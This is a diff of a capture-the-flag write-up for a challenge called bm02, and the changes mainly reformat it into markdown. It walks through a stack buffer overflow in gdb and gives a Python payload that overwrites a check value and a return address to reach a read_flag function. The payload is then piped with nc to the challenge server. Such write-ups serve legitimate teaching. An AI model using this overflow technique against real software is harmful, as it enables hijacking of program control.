@@ -49,37 +49,44 @@ print('A'*20)
 BM02_9.PNG\
 ![image info](BM02_9.PNG)
 * Hold down the Ctrl key and press c to exit the current program
-* Run the program as: 
-  * `run < <(python bm02.py)`
+* To run the program again, we type `run < <(python bm02.py)`
 * Type `y` to start from the beginning
 * In order to see the differences, we enter x/200x $sp to display the current and the next 199 stack pointer.
-	From BM02_9.PNG, we see that there are 25 0x00000000 remaining for us to fill out and then we have to overwrite the 0xdeadbeef.
-	Next, in order for us to change to return address, we need to overwrite the addresses that are before the return address. There are 3 adresses remaining to changes. Then, we changes the return address to 0x5655615d. Remember, we have to write the address in reverse byte order.
-	We changes the contents of the python file to:
+	From BM02_9.PNG, we see that there are twenty-five `0x00000000` remaining for us to fill out and then we have to overwrite the `0xdeadbeef`.
+	Next, in order for us to change to return address, we need to overwrite the addresses that are before the return address. There are three adresses remaining to changes. Then, we changes the return address to `0x5655615d`. Note: we get `0x5655615d` from `disas read_flag` in the debugger. Remember, we have to write the addresses in reverse byte order.
+	So, we changes the contents of the python file to:
 ```python
 print("add_candidate")
 print('A'*120 + '\xef\xbe\xad\xde' + 'A'*12 + '\x5d\x61\x55\x56')
 ```	
 
-BM02_10.PNG
-	Hit Ctrl + c to exit the current program
-	Run the program as:
-	Type run < <(python bm02.py)
-	Type y to start from the beginning
-	Enter info frame to see if the return address changed to 0x5655615d.
-BM02_11.PNG
-	Use si to execute one instruction at a time to see if the program enters the read_flag(void) function.
-	We see that the program enters the read_flag(void) function.
-BM02_12.PNG
-	Use si to execute one instruction at a time and we will see the flag eventually.
-BM02_13.PNG
-	In order to get the server to response to our request, we also need to print out the last name and the job title, so we edit the python file as below:
-	print("add_candidate")
-	print('A'*120 + '\xef\xbe\xad\xde' + 'A'*12 + '\x5d\x61\x55\x56')
-	print("last name")
-	print("job title")
-	Send the bm02.py to the server and it would prints out the flag.
-	python bm02.py | nc bm02.allyourbases.co 9003
+BM02_10.PNG\
+![image info](BM02_10.PNG)
+* Hold down the Ctrl key and press c to exit the current program
+* To run the program again, we type `run < <(python bm02.py)`
+* Type y to start from the beginning
+* Enter `info frame` to see if the return address changed to `0x5655615d`.
+
+BM02_11.PNG\
+![image info](BM02_11.PNG)
+* Use `si` to execute one instruction at a time to see if the program enters the `read_flag(void)` function.
+* We see that the program enters the `read_flag(void)` function.
+
+BM02_12.PNG\
+![image info](BM02_12.PNG)
+* Use `si` to execute one instruction at a time and we will see the flag eventually.
+
+BM02_13.PNG\
+![image info](BM02_13.PNG)
+* In order to get the server to response to our request, we need to print out the last name and the job title. So we edit the python file as below:
+```python
+print("add_candidate")
+print('A'*120 + '\xef\xbe\xad\xde' + 'A'*12 + '\x5d\x61\x55\x56')
+print("last name")
+print("job title")
+```	
+* Send the bm02.py to the server and it would prints out the flag.
+  * `python bm02.py | nc bm02.allyourbases.co 9003`
 
 
 
